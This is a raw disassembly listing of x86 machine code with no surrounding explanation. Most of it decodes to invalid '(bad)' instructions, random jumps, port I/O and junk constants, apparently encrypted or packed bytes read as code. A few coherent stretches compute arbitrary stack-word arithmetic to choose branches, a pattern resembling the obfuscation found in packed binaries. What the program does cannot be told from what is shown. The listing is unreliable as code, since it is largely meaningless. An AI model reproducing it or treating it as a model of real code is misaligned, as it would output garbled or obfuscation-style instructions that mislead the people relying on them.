  41b975:	outs   dx,BYTE PTR ds:[esi]
  41b976:	fsubr  QWORD PTR [edi-0x55]
  41b979:	adc    BYTE PTR [ebp-0x8278bb1],cl
  41b97f:	inc    edx
  41b980:	mov    bh,0x34
  41b982:	push   esp
  41b983:	pop    esp
  41b984:	mov    ebp,0x3ee593a3
  41b989:	dec    esi
  41b98a:	mov    ecx,0xd4a9e63
  41b98f:	dec    edi
  41b990:	addr16 (bad) 
  41b992:	push   ds
  41b993:	jae    0x41b9cc
  41b995:	xchg   ecx,eax
  41b996:	jb     0x41b9ac
  41b998:	pop    edi
  41b999:	test   DWORD PTR [eax-0x79],ecx
  41b99c:	in     al,0xb0
  41b99e:	sbb    BYTE PTR [edi],bh
  41b9a0:	and    DWORD PTR ds:0x2ae1c2dc,esp
  41b9a6:	pop    edx
  41b9a7:	cmovbe edi,DWORD PTR [edx+esi*1]
  41b9ab:	movups XMMWORD PTR [ecx],xmm1
  41b9ae:	les    ebp,FWORD PTR [ebx-0x52]
  41b9b1:	out    0xf7,eax
  41b9b3:	stos   DWORD PTR es:[edi],eax
  41b9b4:	scas   eax,DWORD PTR es:[edi]
  41b9b5:	stos   DWORD PTR es:[edi],eax
  41b9b6:	push   ebp
  41b9b7:	pop    ebp
  41b9b8:	test   BYTE PTR [ecx-0x76da90a2],ah
  41b9be:	shl    DWORD PTR [esi],0x50
  41b9c1:	shl    BYTE PTR [edx+0x3e3ca4c0],1
  41b9c7:	push   cs
  41b9c8:	jns    0x41b9d9
  41b9ca:	cmp    ch,BYTE PTR [ecx]
  41b9cc:	popa   
  41b9cd:	ins    DWORD PTR es:[edi],dx
  41b9ce:	xor    ecx,esi
  41b9d0:	arpl   WORD PTR [ebx+edi*8+0x4220aa6],dx
  41b9d7:	xrelease mov DWORD PTR [ebp+0x2f],esp
  41b9db:	pushf  
  41b9dc:	lahf   
  41b9dd:	sbb    DWORD PTR [ebx-0x58038aa],ecx
  41b9e3:	hlt    
  41b9e4:	int3   
  41b9e5:	cs aas 
  41b9e7:	jo     0x41b9eb
  41b9e9:	loopne 0x41b9f3
  41b9eb:	mov    bh,0xc8
  41b9ed:	sti    
  41b9ee:	fsub   DWORD PTR [ebp+0x1d9792d4]
  41b9f4:	out    0x1d,al
  41b9f6:	adc    edi,ecx
  41b9f8:	mov    dl,BYTE PTR [edx-0x7c]
  41b9fb:	pop    edi
  41b9fc:	lahf   
  41b9fd:	mov    esp,0xec1e95be
  41ba02:	inc    esp
  41ba03:	sbb    esi,esp
  41ba05:	dec    esi
  41ba06:	scas   al,BYTE PTR es:[edi]
  41ba07:	(bad)  
  41ba09:	ret    
  41ba0a:	lahf   
  41ba0b:	add    ebx,esp
  41ba0d:	jb     0x41ba57
  41ba0f:	les    edi,FWORD PTR [eax]
  41ba11:	iret   
  41ba12:	cli    
  41ba13:	cli    
  41ba14:	or     eax,0xa13fbe98
  41ba19:	push   edx
  41ba1a:	pop    edx
  41ba1b:	xlat   BYTE PTR ds:[ebx]
  41ba1c:	dec    eax
  41ba1d:	lods   al,BYTE PTR ds:[esi]
  41ba1e:	orps   xmm1,XMMWORD PTR [ebx+0x104bee0e]
  41ba25:	xchg   BYTE PTR [ebp-0x78a97408],dh
  41ba2b:	les    eax,FWORD PTR [edx-0x68]
  41ba2e:	cmp    bl,BYTE PTR [eax]
  41ba30:	out    dx,al
  41ba31:	jae    0x41ba06
  41ba33:	mov    ebx,0x74e8230
  41ba38:	dec    edi
  41ba39:	inc    ebp
  41ba3a:	jmp    0x41ba87
  41ba3c:	aas    
  41ba3d:	adc    esp,DWORD PTR [edx+ecx*4]
  41ba40:	mov    esi,0x6c4237a
  41ba45:	fidivr DWORD PTR [ebx+0x41]
  41ba48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba49:	inc    edi
  41ba4a:	aas    
  41ba4b:	movq   QWORD PTR [edx-0x11],mm2
  41ba4f:	mov    ch,0x71
  41ba51:	and    DWORD PTR [ecx],0xa023a05
  41ba57:	pop    es
  41ba58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba59:	add    dl,ch
  41ba5b:	cmp    DWORD PTR [eax],ecx
  41ba5d:	sbb    bh,0x42
  41ba60:	cmp    eax,0xbc139f56
  41ba65:	ins    DWORD PTR es:[edi],dx
  41ba66:	stos   DWORD PTR es:[edi],eax
  41ba67:	pop    ebp
  41ba68:	mov    al,ds:0x9ee1fe4
  41ba6d:	arpl   bx,sp
  41ba6f:	arpl   WORD PTR [edx-0x7b960d1b],cx
  41ba75:	cmc    
  41ba76:	cs and al,0x27
  41ba79:	jns    0x41ba60
  41ba7b:	push   esi
  41ba7c:	inc    ecx
  41ba7d:	push   edi
  41ba7e:	rcl    DWORD PTR [ecx+0x66638187],1
  41ba84:	xchg   ecx,eax
  41ba85:	ret    
  41ba86:	(bad)  
  41ba87:	cwde   
  41ba88:	lods   eax,DWORD PTR ds:[esi]
  41ba89:	mov    ebx,0xb8683203
  41ba8e:	inc    edx
  41ba8f:	xor    DWORD PTR [edi-0x7687d375],ebx
  41ba95:	loopne 0x41ba2b
  41ba97:	cmp    DWORD PTR [eax+0x2d9bf68d],ebx
  41ba9d:	mov    bl,0x11
  41ba9f:	mov    edx,0x14be14c6
  41baa4:	cmp    DWORD PTR [edx],esp
  41baa6:	jmp    0x889:0xe0373939
  41baad:	xor    ebx,DWORD PTR [esi+0x58]
  41bab0:	pop    ds
  41bab1:	or     BYTE PTR ds:0xd03546f6,al
  41bab7:	xor    eax,0xbfc4179
  41babc:	sbb    bh,BYTE PTR [edi-0x700b4d3f]
  41bac2:	lea    ebp,[esi-0x7c]
  41bac5:	mov    ah,0x87
  41bac7:	mov    esi,0xfdb16007
  41bacc:	ja     0x41baa2
  41bace:	push   ss
  41bacf:	and    DWORD PTR [esi+0x4f43678c],ecx
  41bad5:	cwde   
  41bad6:	fnstcw WORD PTR [ecx+0x36]
  41bad9:	test   DWORD PTR [ecx-0x5e],edi
  41badc:	sub    ebx,DWORD PTR [ecx+ebx*4]
  41badf:	xor    al,0xa0
  41bae1:	aad    0xfd
  41bae3:	mov    dl,0x65
  41bae5:	mov    eax,0x2776c734
  41baea:	aaa    
  41baeb:	into   
  41baec:	in     al,0x1f
  41baee:	test   eax,0xd7746db2
  41baf3:	and    BYTE PTR [edx+edx*8-0x7e],0x60
  41baf8:	mov    edx,0xb2df1c5a
  41bafd:	mov    ds:0x8c8e0aba,eax
  41bb02:	dec    ebx
  41bb03:	inc    esp
  41bb04:	icebp  
  41bb05:	out    dx,al
  41bb06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb07:	inc    ebp
  41bb08:	inc    ebx
  41bb09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0a:	add    DWORD PTR [ecx+0x1a29657b],ecx
  41bb10:	add    eax,0x49a7d1b6
  41bb15:	mov    bh,0xe
  41bb17:	push   ds
  41bb18:	push   eax
  41bb19:	and    eax,0xf7f92167
  41bb1e:	pop    eax
  41bb1f:	nop
  41bb20:	in     al,dx
  41bb21:	and    eax,0x41642dc6
  41bb26:	push   0xa
  41bb28:	call   0x565dbd1
  41bb2d:	ret    0x9af6
  41bb30:	and    BYTE PTR [edi+0x5cc271c9],cl
  41bb36:	rol    BYTE PTR [edi+ebx*1-0x69d731df],cl
  41bb3d:	fs mov ch,0x39
  41bb40:	jne    0x41bb8b
  41bb42:	jmp    0x4d7a060a
  41bb47:	cmc    
  41bb48:	mov    ebx,0x235045f
  41bb4d:	mov    al,0xd9
  41bb4f:	leave  
  41bb50:	or     DWORD PTR [edx+edx*4+0x5ae64759],eax
  41bb57:	push   ecx
  41bb58:	dec    ebx
  41bb59:	ins    BYTE PTR es:[edi],dx
  41bb5a:	push   es
  41bb5b:	fwait
  41bb5c:	stc    
  41bb5d:	xchg   ebp,eax
  41bb5e:	mul    DWORD PTR [edi-0x42]
  41bb61:	jnp    0x41bbb3
  41bb63:	xchg   ebp,eax
  41bb64:	fucom  st(6)
  41bb66:	lods   eax,DWORD PTR ds:[esi]
  41bb67:	je     0x41bb2c
  41bb69:	lds    ebx,FWORD PTR [ebp+0x49]
  41bb6c:	out    0xea,al
  41bb6e:	ficomp WORD PTR [edi-0x27]
  41bb71:	sub    al,0x18
  41bb73:	or     al,0x4e
  41bb75:	xchg   esp,eax
  41bb76:	fld    QWORD PTR [edi-0x41ff7f05]
  41bb7c:	out    dx,al
  41bb7d:	xor    BYTE PTR [esp+ebx*1],ah
  41bb80:	xchg   ebp,eax
  41bb81:	out    dx,al
  41bb82:	aas    
  41bb83:	cdq    
  41bb84:	rol    ebp,0xc8
  41bb87:	sbb    al,0xd0
  41bb89:	jecxz  0x41bbf3
  41bb8b:	adc    esp,DWORD PTR [esi]
  41bb8d:	jl     0x41bbf0
  41bb8f:	ss push ss
  41bb91:	loope  0x41bbd7
  41bb93:	jg     0x41bc05
  41bb95:	clc    
  41bb96:	frstor [eax+0x40]
  41bb99:	fstp   st(2)
  41bb9b:	add    ah,bh
  41bb9d:	cmp    cl,0x4e
  41bba0:	int3   
  41bba1:	popa   
  41bba2:	mov    edi,0x1c59b347
  41bba7:	div    BYTE PTR ds:0xb0ef1538
  41bbad:	mov    esi,0xa8a292aa
  41bbb2:	xchg   esp,eax
  41bbb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbb4:	jno    0x41bbcf
  41bbb6:	stos   BYTE PTR es:[edi],al
  41bbb7:	in     eax,dx
  41bbb8:	hlt    
  41bbb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbba:	std    
  41bbbb:	or     BYTE PTR [ebp-0x67aab60a],ah
  41bbc1:	inc    esp
  41bbc2:	aad    0x3c
  41bbc4:	xchg   ebp,eax
  41bbc5:	push   es
  41bbc6:	add    al,0x62
  41bbc8:	(bad)  
  41bbc9:	jmp    0x6546b46d
  41bbce:	cdq    
  41bbcf:	in     al,0x86
  41bbd1:	shl    BYTE PTR [esi+0x23],cl
  41bbd4:	retf   0x8b66
  41bbd7:	push   esp
  41bbd8:	and    al,0x24
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	adc    al,0x8e
  41bc03:	sub    DWORD PTR [edx+0x18168103],ebp
  41bc09:	mov    esp,0xd0181812
  41bc0e:	add    eax,0x438c274e
  41bc13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc14:	scas   eax,DWORD PTR es:[edi]
  41bc15:	dec    ecx
  41bc16:	sbb    al,0x81
  41bc18:	in     al,0x1a
  41bc1a:	push   0x68f9cd0f
  41bc1f:	cmp    eax,0x6c728803
  41bc24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc25:	add    al,0xbf
  41bc27:	push   edx
  41bc28:	retf   
  41bc29:	push   es
  41bc2a:	daa    
  41bc2b:	stos   DWORD PTR es:[edi],eax
  41bc2c:	popa   
  41bc2d:	loopne 0x41bbb1
  41bc2f:	ins    DWORD PTR es:[edi],dx
  41bc30:	and    edi,0x3b
  41bc33:	adc    eax,0x3ef7d2e9
  41bc38:	push   0xfffffffa
  41bc3a:	inc    edi
  41bc3b:	adc    eax,0xd8141d11
  41bc40:	pop    ebp
  41bc41:	arpl   WORD PTR [esi+edx*8-0x7c],bp
  41bc45:	or     bh,bl
  41bc47:	stos   BYTE PTR es:[edi],al
  41bc48:	cmp    bh,bh
  41bc4a:	mov    edx,0x205447c4
  41bc4f:	push   edx
  41bc50:	mov    ecx,0xd9c00744
  41bc55:	fadd   DWORD PTR [ecx-0x65]
  41bc58:	sar    BYTE PTR [ebx-0x67be590f],1
  41bc5e:	cmp    eax,0x94db99d0
  41bc63:	dec    BYTE PTR [eax+0x23]
  41bc66:	xchg   ebp,eax
  41bc67:	push   cs
  41bc68:	sbb    al,BYTE PTR [ecx-0x65809194]
  41bc6e:	pop    ds
  41bc6f:	out    dx,al
  41bc70:	rcl    DWORD PTR [edi-0x965b1de],0x8b
  41bc77:	fidivr DWORD PTR [ebx+0x3a]
  41bc7a:	aaa    
  41bc7b:	pop    ebp
  41bc7c:	xchg   BYTE PTR [edx],ch
  41bc7e:	dec    ebp
  41bc7f:	jg     0x41bca5
  41bc81:	inc    ebx
  41bc82:	jmp    FWORD PTR [ecx-0x7abc0a68]
  41bc88:	arpl   WORD PTR [ebx-0x9],ax
  41bc8b:	add    eax,0x9427e731
  41bc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc91:	les    ebx,FWORD PTR [ebx]
  41bc93:	pop    eax
  41bc94:	sbb    BYTE PTR [esi],al
  41bc96:	add    dh,BYTE PTR [esi]
  41bc98:	pushf  
  41bc99:	pop    es
  41bc9a:	or     ch,al
  41bc9c:	lock fnstsw WORD PTR [edi-0x6949942a]
  41bca3:	adc    bl,BYTE PTR [esi+0x2ba4308b]
  41bca9:	sti    
  41bcaa:	inc    ebp
  41bcab:	jb     0x41bc3b
  41bcad:	pop    esp
  41bcae:	(bad)  
  41bcaf:	enter  0x77e9,0xf2
  41bcb3:	bound  esp,QWORD PTR [ebx+0x7767336a]
  41bcb9:	cmp    ah,BYTE PTR [ebx]
  41bcbb:	dec    edi
  41bcbc:	jle    0x41bcec
  41bcbe:	cli    
  41bcbf:	mov    edx,0x8f86ac3c
  41bcc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcc5:	leave  
  41bcc6:	sahf   
  41bcc7:	sti    
  41bcc8:	daa    
  41bcc9:	mov    bl,0x83
  41bccb:	mov    ds:0x7f06aa56,eax
  41bcd0:	and    ah,BYTE PTR [edi]
  41bcd2:	mov    ch,0xa2
  41bcd4:	call   0x8380:0xfc910adf
  41bcdb:	retf   0xe0fb
  41bcde:	push   ebx
  41bcdf:	shl    al,0x47
  41bce2:	mov    BYTE PTR [ebx],al
  41bce4:	push   cs
  41bce5:	mov    ds:0x398d3b0f,al
  41bcea:	in     al,dx
  41bceb:	cmc    
  41bcec:	jmp    0x41bd03
  41bcee:	pop    edi
  41bcef:	or     al,0x74
  41bcf1:	xor    al,0xf3
  41bcf3:	sbb    DWORD PTR [ebx],edi
  41bcf5:	xor    eax,DWORD PTR [ebx+edi*4]
  41bcf8:	jmp    0x6e167232
  41bcfd:	mov    ah,0xc7
  41bcff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd00:	and    eax,DWORD PTR [edx-0x33fca122]
  41bd06:	cdq    
  41bd07:	dec    ebx
  41bd08:	cld    
  41bd09:	inc    edx
  41bd0a:	add    BYTE PTR [esi-0x58],bl
  41bd0d:	cmp    al,0x39
  41bd10:	xor    ebp,esi
  41bd12:	xchg   edi,eax
  41bd13:	outs   dx,DWORD PTR ds:[esi]
  41bd14:	icebp  
  41bd15:	(bad)  
  41bd16:	int    0xf
  41bd18:	mov    al,0xf6
  41bd1a:	retf   0xdad9
  41bd1d:	pop    edi
  41bd1e:	inc    edx
  41bd1f:	push   es
  41bd20:	mov    esp,0xd85dd488
  41bd25:	ds aad 0x5c
  41bd28:	xchg   esi,eax
  41bd29:	inc    edi
  41bd2a:	out    dx,al
  41bd2b:	div    dl
  41bd2d:	sub    BYTE PTR ds:0x63586ed3,dl
  41bd33:	xlat   BYTE PTR ds:[ebx]
  41bd34:	adc    bh,ch
  41bd36:	(bad)  
  41bd37:	(bad)  
  41bd38:	icebp  
  41bd39:	jle    0x41bcc0
  41bd3b:	jb     0x41bd27
  41bd3d:	mov    ch,0xeb
  41bd3f:	fnstenv [esi-0x3d265994]
  41bd45:	add    dh,ah
  41bd47:	add    cl,cl
  41bd49:	cld    
  41bd4a:	inc    ebx
  41bd4b:	sti    
  41bd4c:	js     0x41bd1f
  41bd4e:	ja     0x41bdc4
  41bd50:	jno    0x41bd19
  41bd52:	shr    DWORD PTR [eax],0xe4
  41bd55:	adc    BYTE PTR [ecx],cl
  41bd57:	inc    edx
  41bd58:	jnp    0x41bd80
  41bd5a:	popf   
  41bd5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd5c:	vpmadcsswd ymm11,ymm5,ymm3,ymm7
  41bd62:	pop    es
  41bd63:	retf   
  41bd64:	jb     0x41bdab
  41bd66:	test   eax,0x70edcea9
  41bd6b:	xchg   edx,eax
  41bd6c:	in     al,dx
  41bd6d:	das    
  41bd6e:	jle    0x41bdd4
  41bd70:	aas    
  41bd71:	dec    edx
  41bd72:	lods   al,BYTE PTR ds:[esi]
  41bd73:	jle    0x41bda8
  41bd75:	jbe    0x41bdca
  41bd77:	ds jne 0x41bdf5
  41bd7a:	sub    DWORD PTR [esi-0x28],eax
  41bd7d:	jmp    FWORD PTR [ebx-0x20]
  41bd80:	js     0x41bdee
  41bd82:	xchg   ebp,eax
  41bd83:	or     al,0xc
  41bd85:	jmp    0x5348d3a8
  41bd8a:	inc    eax
  41bd8b:	mov    ebp,DWORD PTR [edi-0x66f16e6c]
  41bd91:	(bad)  [esi-0x26]
  41bd94:	popf   
  41bd95:	lock test cl,al
  41bd98:	test   al,0x6
  41bd9a:	dec    esi
  41bd9b:	fisubr WORD PTR [edx]
  41bd9d:	adc    DWORD PTR [eax-0x5b],ebx
  41bda0:	(bad)  
  41bda1:	stc    
  41bda2:	jle    0x41bd80
  41bda4:	sub    BYTE PTR [esi],al
  41bda6:	xchg   BYTE PTR [esi-0x7ef7d1f0],bh
  41bdac:	ret    
  41bdad:	retf   
  41bdae:	mov    dh,ch
  41bdb0:	sti    
  41bdb1:	and    BYTE PTR [eax-0x204cad07],ah
  41bdb7:	mov    cl,0x92
  41bdb9:	lock mov ?,ebp
  41bdbc:	mov    esi,0xc11cf16c
  41bdc1:	dec    ecx
  41bdc2:	jnp    0x41bdc9
  41bdc4:	push   esp
  41bdc5:	shl    cl,cl
  41bdc7:	cmp    bl,bl
  41bdc9:	push   ebp
  41bdca:	aas    
  41bdcb:	iret   
  41bdcc:	clc    
  41bdcd:	fnstsw ax
  41bdcf:	sbb    dl,BYTE PTR [eax-0x76ce8ef5]
  41bdd5:	aas    
  41bdd6:	add    al,0x23
  41bdd8:	cmp    eax,0x7d4f9c6c
  41bddd:	fbld   TBYTE PTR ds:0x3c91a0f
  41bde3:	add    DWORD PTR [ecx+0xfca6e97],ecx
  41bde9:	xchg   ebp,eax
  41bdea:	(bad)  
  41bdeb:	adc    BYTE PTR [edx],bh
  41bded:	int3   
  41bdee:	mov    ch,0x83
  41bdf0:	cmp    eax,0x7f1f9f05
  41bdf5:	fs push ss
  41bdf7:	or     cl,BYTE PTR [eax+0x4d51df20]
  41bdfd:	sub    BYTE PTR [edi-0x5e],al
  41be00:	(bad)  
  41be01:	jns    0x41bddc
  41be03:	add    BYTE PTR [ebx+0x2e],cl
  41be06:	push   esp
  41be07:	jp     0x41bda2
  41be09:	dec    edx
  41be0a:	xor    eax,0xee6139fd
  41be0f:	cmp    esp,DWORD PTR [edi-0x41]
  41be12:	in     al,dx
  41be13:	add    eax,0xe9e33960
  41be18:	xchg   ebp,eax
  41be19:	cmp    DWORD PTR [edi],ebx
  41be1b:	mov    edx,0xb3fa0e13
  41be20:	loop   0x41be08
  41be22:	test   BYTE PTR [edi+0x17c0dba1],bh
  41be28:	mov    edi,0x4704bea4
  41be2d:	sbb    BYTE PTR [edi+eiz*2-0x267ec61],ch
  41be34:	mov    esp,0x6124aeea
  41be39:	jnp    0x41be92
  41be3b:	push   ecx
  41be3c:	adc    DWORD PTR [ebx-0x40],eax
  41be3f:	scas   eax,DWORD PTR es:[edi]
  41be40:	popa   
  41be41:	sbb    al,bl
  41be43:	in     al,0xa1
  41be45:	lock pop edi
  41be47:	pop    edi
  41be48:	jmp    0x2ff02b1e
  41be4d:	add    al,0xcf
  41be4f:	repz repz mov ds:0xb80b39e7,al
  41be56:	jmp    0x37c2:0xe4b0
  41be5c:	add    ebx,ebx
  41be5e:	sahf   
  41be5f:	mov    ch,0x7c
  41be61:	in     al,0x7b
  41be63:	aad    0x24
  41be65:	dec    eax
  41be66:	pop    edx
  41be67:	xchg   edi,eax
  41be68:	ret    
  41be69:	scas   eax,DWORD PTR es:[edi]
  41be6a:	sti    
  41be6b:	retf   
  41be6c:	or     al,0x47
  41be6e:	push   eax
  41be6f:	ins    DWORD PTR es:[edi],dx
  41be70:	nop
  41be71:	icebp  
  41be72:	mov    ds:0x246c4e3e,al
  41be77:	ds jne 0x41beea
  41be7a:	inc    eax
  41be7b:	or     esi,DWORD PTR fs:0x63d91f4c
  41be82:	stc    
  41be83:	mov    WORD PTR [ecx+0xa],es
  41be86:	mov    dh,0x2e
  41be88:	int3   
  41be89:	out    0xeb,al
  41be8b:	or     ch,BYTE PTR ds:0xa5c23e4c
  41be91:	mov    ecx,0xb40a3bab
  41be96:	jp     0x41bedf
  41be98:	stos   DWORD PTR es:[edi],eax
  41be99:	daa    
  41be9a:	xlat   BYTE PTR ss:[ebx]
  41be9c:	retf   0xf374
  41be9f:	sub    edx,DWORD PTR [ebx+esi*1-0x152ee3a8]
  41bea6:	shl    BYTE PTR [ebp+0x4c126631],0x79
  41bead:	add    cl,BYTE PTR [esp+ecx*8+0x27]
  41beb1:	pop    ss
  41beb2:	dec    esi
  41beb3:	cmp    cl,0xc6
  41beb6:	cmp    dl,BYTE PTR [ebp-0x38]
  41beb9:	out    dx,eax
  41beba:	(bad)  
  41bebc:	mov    al,0x9
  41bebe:	int3   
  41bebf:	sub    dh,BYTE PTR [ebp+0x3]
  41bec2:	stos   DWORD PTR es:[edi],eax
  41bec3:	ins    BYTE PTR es:[edi],dx
  41bec4:	fstp   TBYTE PTR [ebx]
  41bec6:	xlat   BYTE PTR ds:[ebx]
  41bec7:	push   es
  41bec8:	retf   0x90c5
  41becb:	xchg   BYTE PTR [esi+0x39c992a1],cl
  41bed1:	icebp  
  41bed2:	ins    BYTE PTR es:[edi],dx
  41bed3:	adc    cl,bl
  41bed5:	sub    al,0x44
  41bed7:	test   BYTE PTR [ebp+0x14c74917],cl
  41bedd:	jne    0x41beb3
  41bedf:	(bad)  
  41bee0:	jb     0x41be84
  41bee2:	push   ebx
  41bee3:	cmp    BYTE PTR [edx],ah
  41bee5:	jnp    0x41bf22
  41bee7:	out    0x77,eax
  41bee9:	fisttp WORD PTR [eax]
  41beeb:	xor    al,BYTE PTR [edi-0x4]
  41beee:	push   es
  41beef:	xchg   ebp,eax
  41bef0:	mov    ecx,0xe6266294
  41bef5:	fld    TBYTE PTR [ebp+0x63]
  41bef8:	test   al,0x28
  41befa:	test   al,0x95
  41befc:	inc    edi
  41befd:	xor    BYTE PTR [ecx+0x4a],0x21
  41bf01:	sbb    edx,DWORD PTR [edx+0x402df2f8]
  41bf07:	dec    eax
  41bf08:	scas   eax,DWORD PTR es:[edi]
  41bf09:	dec    ebx
  41bf0a:	jl     0x41bee5
  41bf0c:	outs   dx,DWORD PTR ds:[esi]
  41bf0d:	test   esi,esi
  41bf0f:	ja     0x41bed4
  41bf11:	sbb    eax,DWORD PTR [edi-0x3cc8a5e6]
  41bf17:	jb     0x41bee3
  41bf19:	mov    edx,0xff046a87
  41bf1e:	mov    ch,0x4a
  41bf20:	fbld   TBYTE PTR [ecx+ebx*2]
  41bf23:	xchg   esp,eax
  41bf24:	adc    bl,BYTE PTR [esi-0x3cd06da3]
  41bf2a:	test   DWORD PTR [edx-0x57],eax
  41bf2d:	mov    WORD PTR [esi-0x58fc0022],ds
  41bf33:	je     0x41bf0f
  41bf35:	jbe    0x41bedc
  41bf37:	inc    edx
  41bf38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf39:	sub    ebx,DWORD PTR ss:[edi-0x7c]
  41bf3d:	test   al,ch
  41bf3f:	and    eax,0x3149d956
  41bf44:	std    
  41bf45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf46:	repz sbb al,0x34
  41bf49:	test   eax,0x8219d98d
  41bf4e:	or     dh,BYTE PTR [ebp+esi*2-0x537c5e4c]
  41bf55:	xlat   BYTE PTR ds:[ebx]
  41bf56:	enter  0xef10,0x5a
  41bf5a:	ins    BYTE PTR es:[edi],dx
  41bf5b:	mov    ds:0x85023c55,eax
  41bf60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf61:	call   0xd156e7d9
  41bf66:	mov    al,ds:0x46b70d4e
  41bf6b:	stos   DWORD PTR es:[edi],eax
  41bf6c:	add    esi,esi
  41bf6e:	sub    edi,esi
  41bf70:	adc    BYTE PTR [ecx+0x5],0x26
  41bf74:	ret    
  41bf75:	mov    dl,0x70
  41bf77:	cmp    bh,dl
  41bf79:	cld    
  41bf7a:	sbb    BYTE PTR [ecx-0x16],bh
  41bf7d:	mov    dh,dl
  41bf7f:	pop    esi
  41bf80:	or     edx,ebp
  41bf82:	aas    
  41bf83:	je     0x41bf3a
  41bf85:	or     eax,0xc9f465ac
  41bf8a:	pop    ebx
  41bf8b:	jmp    0x5d9504c
  41bf90:	mov    bh,0x43
  41bf92:	adc    al,0xb6
  41bf94:	jg     0x41bfe4
  41bf96:	sub    DWORD PTR [edi-0x1b],edi
  41bf99:	sbb    BYTE PTR [edi-0x4c],ah
  41bf9c:	cmp    ah,BYTE PTR [esi]
  41bf9e:	mov    ebx,fs
  41bfa0:	not    DWORD PTR [esi+0x8]
  41bfa3:	call   0x3dc0:0xfdcf2c23
  41bfaa:	add    DWORD PTR [eax+esi*8+0x66169c5a],esp
  41bfb1:	dec    eax
  41bfb2:	pusha  
  41bfb3:	pop    edx
  41bfb4:	mov    bl,0x8d
  41bfb6:	xchg   BYTE PTR [edx+0x55],dh
  41bfb9:	retf   
  41bfba:	rol    BYTE PTR [edx],0x67
  41bfbd:	test   eax,0x57d4b9a3
  41bfc2:	add    BYTE PTR [eax],al
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41c0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0f9:	mov    esp,0x181679a7
  41c0fe:	mov    esp,0x89181812
